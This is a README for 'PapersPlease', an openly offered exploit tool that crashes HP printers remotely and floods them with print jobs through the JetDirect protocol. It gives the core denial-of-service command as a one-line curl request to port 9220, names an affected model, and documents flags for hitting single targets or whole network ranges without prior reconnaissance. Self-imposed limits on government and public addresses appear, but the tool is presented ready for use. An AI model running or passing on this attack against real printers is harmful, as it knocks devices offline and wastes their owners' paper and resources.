
# PapersPlease

<div align="center">

<img src="./Assets/Papers_Please_Logo.png" width="20%" />
<br><br>
</div>

## Description

PapersPlease is an exploit that allows an attacker to remotely crash an HP printer.
So far residential class printers have been observed to be exploitable by this vulnerability.
The tool also comes with the ability to mass print documents from either a single printer 
or all printers on a network by abusing HPs JetDirect protocol found on port 9100.

Notice that the program will stop you from connecting to known government external 
IP addresses. While not blocking all of them, it is there to stop skiddies from accidentally 
(or purposefully) scanning government addresses… as that would be bad.  

Also note that while exploiting a network range, you will only be able to specify a private IP address. 
As I’m not going to be responsible for some kid taking every port-forwarded printer down 
on the Internet, as funny as that would be. 

NOTE: To recover from the vulnerability after being exploited, you will have to power-cycle your printer.
As the exploit is crashing an internal process which causes the printer to go into a 
"failed" state.

Additionally:<br>
This script is fully compatible with `Termux` for Android.

## How It Works

While the inner workings are more complicated, the exploit in its purest form is as follows:<br>
`curl [IP]:9220 -X 'open 99999999'`<br>
As mentioned above, the printer will go into a failed state and remain in said state until restarted.

## Known Affected Models
| Model | DoS | Mass Print |
| :---  | :---: |     ---: |
|  HP Envy 7640  |  TRUE  |  False  |

**NOTE**:<br>
While the above models are confirmed to be vulnerable, you will usually not know what you are exploiting in the real world.
As the program is made to be a 'point and shoot' no prior recon is required.
However you can still specify specific printers with the `--target` flag.

## Usage

`-t`, `--target={IP}`       Specify a specific target rather than all addresses on the network.

`-n`, `--network={IP/CIDR}` Manually specify the network address for the current network you are on.

`--papyrus={N}`             Number of jobs to send to the printer this should cause the printer to print 
                            N number of pages.

`-i`, `--interval={N}`      The interval before another job is sent to the printer. Where N can be a decimal
                            i.e. 0.1 or a whole number. The default interval is 1.             

`-j`, `--jobs={-N|+N|N%|N}` Number of jobs to run. Passes value to parallel. Defaults to 0.

`-p`, `--proc={-N|+N|N%|N}` Define the maximum N of processes that can be active at a time. Defaults to 1.

`-s`, `--slots={-N|+N|N%|N}`The amount of 'slots' available to be used by parallel for jobs. Default is 252.

`-P`, `--port={PORT}`       Specify a specific port. Useful for port-forwarded hosts. Port number is set 
                            automatically based on the attack being preformed. PORT can be any number ranging
                            from 1 to 65535.
                            
`--no-check`                Will skip dependency checking.

`-q`, `--quiet`             Suppress output to terminal. Only the progress bar from parallel will be
                            printed to the terminal in this mode.

`-v`, `--version`           Print version information then exit.

`-h`, `--help`              Print this dialog page.
